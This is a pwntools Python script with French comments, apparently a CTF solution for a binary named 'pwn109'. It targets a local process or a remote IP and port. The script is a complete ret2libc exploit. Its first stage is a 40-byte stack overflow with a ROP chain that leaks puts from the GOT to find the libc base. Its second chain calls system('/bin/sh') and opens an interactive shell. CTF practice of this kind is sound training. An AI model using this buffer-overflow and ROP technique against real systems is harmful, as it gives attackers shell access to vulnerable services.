from pwn import *

context.binary = ELF('./pwn109-1644300507645.pwn109')
context.log_level = 'info'

# Configuration
if args.REMOTE:
    libc = ELF('./libc-remote.so')
    p = remote('10.128.131.51', 9009)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn109-1644300507645.pwn109')

# Raccourcis
bin_elf = context.binary  # On utilise un autre nom pour éviter tout conflit

RET = 0x40101a
POP_RDI = 0x4012a3
PUTS_PLT = bin_elf.plt['puts']
PUTS_GOT = bin_elf.got['puts']
MAIN = bin_elf.sym['main']

# --- Phase 1 : Leak puts ---
payload1  = b'A' * 40
payload1 += p64(RET)
payload1 += p64(POP_RDI)
payload1 += p64(PUTS_GOT)
payload1 += p64(PUTS_PLT)
payload1 += p64(MAIN)

p.recvuntil(b'Go ahead')
p.recvrepeat(0.5)
p.sendline(payload1)

leak_raw = p.recv(6)
log.info(f"Raw leak: {leak_raw.hex()}")
puts_leak = u64(leak_raw.ljust(8, b'\x00'))
log.success(f"puts leak: {hex(puts_leak)}")

libc.address = puts_leak - libc.sym['puts']
log.success(f"LIBC base: {hex(libc.address)}")

if libc.address & 0xfff != 0:
    log.error(f"libc_base non aligné : {hex(libc.address)}")
    exit(1)

# --- Phase 2 : system("/bin/sh") ---
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))

# Trouve les gadgets dans la libc
rop_libc = ROP(libc)
pop_rdi_libc = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_libc = rop_libc.find_gadget(['ret'])[0]

payload2  = b'A' * 40
payload2 += p64(ret_libc)        # 1er ret (alignement)
payload2 += p64(ret_libc)        # 2e ret (alignement)
payload2 += p64(pop_rdi_libc)
payload2 += p64(bin_sh)
payload2 += p64(system)

p.recvuntil(b'Go ahead')
p.recvrepeat(0.5)
p.sendline(payload2)

p.interactive()
